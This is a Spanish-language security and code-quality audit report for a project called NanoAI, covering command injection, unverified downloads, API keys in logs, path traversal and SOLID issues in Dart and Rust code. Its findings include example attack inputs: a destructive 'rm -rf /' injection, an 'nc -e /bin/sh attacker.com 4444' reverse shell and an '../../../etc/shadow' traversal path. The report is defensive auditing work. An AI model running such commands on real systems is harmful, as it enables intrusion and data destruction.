# QA Report Ronda 2 — NanoAI v0.1.0
## Análisis de Inyecciones, SOLID, y Código No Revisado

**Fecha:** 2026-08-07
**Método:** Auditoría profunda de Flutter (proot, kali, docker, shell, terminal), Rust orquestador, y vectores de inyección cross-layer
**Total hallazgos nuevos:** 17 (🔴 4 críticos, 🟠 7 altos, 🟡 6 medios)

---

## 🔴 INYECCIÓN Y SEGURIDAD — 4 CRÍTICOS, 6 ALTOS

### 🔴 CRIT #25 — `nanoshell_ffi.dart`: spawnGeneric ejecuta cualquier binario sin validación

**Archivo:** `flutter_app/lib/core/services/nanoshell_ffi.dart:58-78`
**Lenguaje:** Dart + Rust FFI
**Ingeniero(s):** 🔴 Security Auditor, 🟠 Mobile Engineer

**Descripción:** `spawnGeneric()` toma un `binaryPath` absoluto arbitrario y lo carga con `dlopen()` + llama a `main()`. No hay allowlist, no hay validación de path, no hay sandbox. Cualquier binario ELF PIE en el dispositivo puede ejecutarse. En combinación con `proot_manager` (que bind-monta `/dev`, `/proc`, `/sys`), esto permite ejecutar binarios del sistema dentro del jail. `spawnBusyBox()` es igual de peligroso — cualquier applet de BusyBox se ejecuta sin restricción.

**Impacto:** Escalación de privilegios en dispositivo Android. Un atacante que pueda escribir un archivo en el storage de la app puede ejecutar código nativo arbitrario. Herramientas de Kali Linux instaladas se vuelven armas.

**Fix:** Implementar allowlist de binarios permitidos en `spawnGeneric()`. Restringir `spawnBusyBox()` a applets seguros (ls, cat, echo, etc., NO wget, nc, sh, dd).

---

### 🔴 CRIT #26 — `command_dispatcher.dart`: inyección de comandos vía terminal

**Archivo:** `flutter_app/lib/features/terminal/command_dispatcher.dart:39, 51-96, 118`
**Lenguaje:** Dart
**Ingeniero(s):** 🔴 Security Auditor

**Descripción:** El dispatcher toma input del usuario desde la terminal y lo pasa directamente a `shell!.execRootfs()` o `shell!.execRootfsWorker()` como argumentos de comando. En `_runReal()`, el comando y los args vienen de `cmd` y `a` que son el input crudo del usuario. No hay escaping, sanitización ni validación.

Por ejemplo, el comando `run` en línea 91-96:
```dart
shell!.execRootfsWorker(binPath, [cmd, ...a], ...)
```
El `cmd` es lo que el usuario escribió. Si escribe `pkg install; rm -rf /`, se ejecuta.

**Fix:** Validar comandos contra allowlist. Escapar argumentos antes de pasarlos a shell. Usar `Process.run` con argumentos separados (ya se hace parcialmente) pero validar el binario.

---

### 🔴 CRIT #27 — `docker_manager.dart`: ejecución de entrypoint sin validación + capas sin checksum

**Archivo:** `flutter_app/lib/core/services/docker_manager.dart:112-177`
**Lenguaje:** Dart
**Ingeniero(s):** 🔴 Security Auditor

**Descripción:** Doble vector:
1. `run()` toma `cmd` del usuario como entrypoint del contenedor y lo pasa directamente a `_proot.exec()`. Si el usuario ejecuta `docker run alpine nc -e /bin/sh attacker.com 4444`, se ejecuta sin restricción.
2. `pull()` descarga capas de Docker Hub sin verificar checksums. Los blobs se guardan con el digest como nombre de archivo pero nunca se verifica el hash real del contenido. Un layer corrupto o malicioso se extrae con `tar -xf` sin ninguna validación.

**Fix:** Validar entrypoint contra allowlist de binarios conocidos. Verificar SHA256 del digest contra el contenido descargado antes de extraer.

---

### 🔴 CRIT #28 — `kali_manager.dart`: rootfs descargado sin verificación de integridad

**Archivo:** `flutter_app/lib/core/services/kali_manager.dart:48-104`
**Lenguaje:** Dart
**Ingeniero(s):** 🔴 Security Auditor

**Descripción:** `install()` descarga `kalifs-arm64-minimal.tar.xz` (~200MB) desde `kali.download` sin checksum SHA, firma GPG, ni certificate pinning. Cualquier ataque MITM o servidor comprometido puede entregar un rootfs malicioso. El rootfs se extrae y sus binarios se ejecutan vía proot con acceso a `/dev`, `/proc`, `/sys`.

**Fix:** Verificar checksum SHA256 del archivo descargado contra un valor conocido. Implementar certificate pinning para `kali.download`.

---

### 🟠 ALTO #29 — `shell_executor.dart`: Process.start sin allowlist

**Archivo:** `flutter_app/lib/core/services/shell_executor.dart:188`
**Lenguaje:** Dart
**Ingeniero(s):** 🔴 Security Auditor

**Descripción:** El método `stream()` ejecuta cualquier `command` vía `Process.start()`. No hay validación del binario. Es llamado por `proot_manager.exec()`, `bash()`, `execRootfs()`, `execRootfsWorker()`. La única mitigación es que Android SELinux bloquea exec desde app data dir — pero `/system/bin/sh` y proot sí están permitidos.

---

### 🟠 ALTO #30 — `proot_manager.dart`: bind mounts arbitrarios desde el host

**Archivo:** `flutter_app/lib/core/services/proot_manager.dart:99-112`
**Lenguaje:** Dart
**Ingeniero(s):** 🔴 Security Auditor

**Descripción:** El parámetro `bindMounts` permite al caller montar cualquier directorio del host dentro del jail proot. Con `bindMounts: ['/data:/data']`, el proceso dentro del rootfs tendría acceso completo al storage de la app. Aunque actualmente los callers no pasan bind mounts maliciosos, la API lo permite sin restricción.

---

### 🟠 ALTO #31 — `orchestrator/mod.rs`: API key de Anthropic/Gemini/OpenAI en logs sin máscara

**Archivo:** `nanortime-core/src/orchestrator/mod.rs:765-772`
**Lenguaje:** Rust
**Ingeniero(s):** 🔴 Security Auditor

**Descripción:** La API key se lee de `std::env::var(&tier3.api_key_env)`. Si falla, el error incluye el nombre de la variable de entorno pero no el valor (OK). Sin embargo, en `tracing::info!` y `tracing::debug!` calls en esta función no se filtra explícitamente si la key termina en el mensaje. El header `x-api-key` y `Authorization: Bearer` se pasan al cliente HTTP — si el logging de reqwest está a nivel debug, la API key aparece en logs.

---

### 🟠 ALTO #32 — `nano.manifest.json`: sin validación de path traversal

**Archivo:** `nano.manifest.json:8` → `nanortime-core/src/config/manifest.rs`
**Lenguaje:** Rust
**Ingeniero(s):** 🔴 Security Auditor

**Descripción:** El campo `"path": "data/qwen_tmp.gguf"` acepta paths relativos. Si un usuario modifica el manifest y pone `"../../../etc/shadow"`, ¿el `ModelManager` lo rechaza? Necesita canonicalización + validación de prefijo.

---

### 🟠 ALTO #33 — `orchestrator/mod.rs`: Cloud API responses con `unwrap_or("")`

**Archivo:** `nanortime-core/src/orchestrator/mod.rs:803,840,868`
**Lenguaje:** Rust
**Ingeniero(s):** 🔵 QA Lead

**Descripción:** Tres sitios usan `.as_str().unwrap_or("")` para extraer el texto de la respuesta cloud. Si la API responde con un formato inesperado, el texto se silencia a string vacío sin error. El usuario recibe respuesta vacía sin saber que falló. Debería ser un error explícito.

---

### 🟠 ALTO #34 — `memory_manager.rs`: std::sync::Mutex con unwrap() en producción

**Archivo:** `nanortime-core/src/execution/memory_manager.rs:103,141,165`
**Lenguaje:** Rust
**Ingeniero(s):** ⚪ FFI Specialist, 🔵 QA Lead

**Descripción:** `sys.lock().unwrap()` y `profiler.lock().unwrap()` en 3 sitios. Si el Mutex está poisoned (por panic en otro hilo), esto paniquea el hilo actual. En producción, debería usar el patrón `lock_or_null` como se implementó en `streaming_ffi.rs`.

---

### 🟠 ALTO #35 — `nanortime-web`: std::sync::Mutex con unwrap()

**Archivo:** `nanortime-web/src/main.rs:86-87`
**Lenguaje:** Rust
**Ingeniero(s):** ⚪ FFI Specialist

**Descripción:** `self.last_tok_s.lock().unwrap()` y `self.last_confidence.lock().unwrap()`. Mismo problema que #34.

---

## 🟡 ARQUITECTURA Y SOLID — 6 MEDIOS

### 🟡 MEDIO #36 — God Object: `Orchestrator` (1006 líneas, 20+ responsabilidades)

**Archivo:** `nanortime-core/src/orchestrator/mod.rs`
**Lenguaje:** Rust
**Ingeniero(s):** 🟡 Systems Architect

**Descripción:** El `Orchestrator` viola SRP masivamente: routing, privacy, RAG, prompt caching, thermal check, battery check, hallucination detection, tool call parsing (3 formatos), tool execution, cloud API calls (Anthropic + Gemini + OpenAI), streaming, learning from corrections, confidence calculation. Debería dividirse en: `RequestPipeline`, `ToolCallHandler`, `CloudProvider` (trait + 3 impls), `ConfidenceEvaluator`, `RagAugmenter`.

---

### 🟡 MEDIO #37 — God Object: `ShellExecutor` (626 líneas)

**Archivo:** `flutter_app/lib/core/services/shell_executor.dart`
**Lenguaje:** Dart
**Ingeniero(s):** 🟡 Systems Architect

**Descripción:** Maneja asset extraction, rootfs init, nano extraction, binary execution, bash execution, toybox, worker pool, VNC server, package management. Debería dividirse en `AssetManager`, `ProcessExecutor`, `PackageManager`, `VncManager`.

---

### 🟡 MEDIO #38 — Dependency Inversion: `nanortime-core` → `nanortime-ffi` concreto

**Archivos:** `nanortime-core/Cargo.toml:37`, `model_manager.rs`, `lib.rs`
**Lenguaje:** Rust
**Ingeniero(s):** 🟡 Systems Architect

**Descripción:** `nanortime-core` depende directamente del crate concreto `nanortime-ffi`. No hay un trait `InferenceBackend` que abstraiga llama.cpp. Para añadir ONNX, ExecuTorch o NNAPI, hay que modificar el core. El OCP está roto.

**Fix:** Definir trait `InferenceBackend` con métodos `load_model`, `generate`, `tokenize`, `embed`. `nanortime-ffi` lo implementa. `nanortime-core` depende del trait, no del crate.

---

### 🟡 MEDIO #39 — Interface Segregation: `NanoRuntime` expone 10+ métodos públicos

**Archivo:** `nanortime-core/src/lib.rs:134-306`
**Lenguaje:** Rust
**Ingeniero(s):** 🟡 Systems Architect

**Descripción:** `NanoRuntime` expone `process_request`, `process_request_streaming`, `switch_model`, `apply_lora`, `register_tool`, `index_document`, `index_directory`, `learn_from_correction`, `vector_engine()`, `tool_executor()`, `model_manager()`. Muchos consumidores solo necesitan inference. ISP sugiere partir en `InferenceRuntime`, `RagRuntime`, `ToolRuntime`, `AdminRuntime`.

---

### 🟡 MEDIO #40 — `command_dispatcher.dart`: feature envy hacia `ShellExecutor`

**Archivo:** `flutter_app/lib/features/terminal/command_dispatcher.dart`
**Lenguaje:** Dart
**Ingeniero(s):** 🟡 Systems Architect

**Descripción:** El dispatcher accede a `shell!.initialized`, `shell!.execRootfs()`, `shell!.execRootfsWorker()`, `shell!.toybox()`, `shell!.bash()` — accede más a los datos y métodos de `ShellExecutor` que a los suyos propios. Feature envy clásico. Los comandos deberían ser handlers registrados en `ShellExecutor`, no en el dispatcher.

---

### 🟡 MEDIO #41 — `docker_manager.dart`: `_loadState()` es un TODO vacío

**Archivo:** `flutter_app/lib/core/services/docker_manager.dart:51-53`
**Lenguaje:** Dart
**Ingeniero(s):** 🔵 QA Lead

**Descripción:** `_loadState()` tiene `// TODO: persistir estado de containers/imágenes en disco`. Los containers/images solo existen en memoria. Si la app se cierra, todo el estado de Docker se pierde.

---

## Resumen

| # | Severidad | Categoría | Archivo | Hallazgo |
|---|----------|-----------|---------|----------|
| 25 | 🔴 | Inyección | `nanoshell_ffi.dart:58` | spawnGeneric ejecuta cualquier binario sin validación |
| 26 | 🔴 | Inyección | `command_dispatcher.dart:39` | Input de terminal va directo a shell sin sanitizar |
| 27 | 🔴 | Supply Chain | `docker_manager.dart:112` | Entrypoint sin validación + capas sin checksum |
| 28 | 🔴 | Supply Chain | `kali_manager.dart:48` | Rootfs descargado sin verificación de integridad |
| 29 | 🟠 | Inyección | `shell_executor.dart:188` | Process.start sin allowlist de binarios |
| 30 | 🟠 | Privilegios | `proot_manager.dart:99` | Bind mounts arbitrarios sin restricción |
| 31 | 🟠 | Fuga datos | `orchestrator/mod.rs:780` | API keys pueden aparecer en logs |
| 32 | 🟠 | Path Traversal | `manifest.rs` | Sin validación de path traversal |
| 33 | 🟠 | Error handling | `orchestrator/mod.rs:803` | unwrap_or("") silencia errores cloud |
| 34 | 🟠 | Panic | `memory_manager.rs:103` | Mutex unwrap en producción |
| 35 | 🟠 | Panic | `nanortime-web/main.rs:86` | Mutex unwrap en producción |
| 36 | 🟡 | SOLID: SRP | `orchestrator/mod.rs` | God Object: 20+ responsabilidades |
| 37 | 🟡 | SOLID: SRP | `shell_executor.dart` | God Object: 6+ responsabilidades |
| 38 | 🟡 | SOLID: DIP | `Cargo.toml` | Dependencia concreta, no trait |
| 39 | 🟡 | SOLID: ISP | `lib.rs` | 10+ métodos en interfaz monolítica |
| 40 | 🟡 | Feature Envy | `command_dispatcher.dart` | Accede más a ShellExecutor que a sí mismo |
| 41 | 🟡 | TODO | `docker_manager.dart:51` | _loadState() vacío — estado volátil |
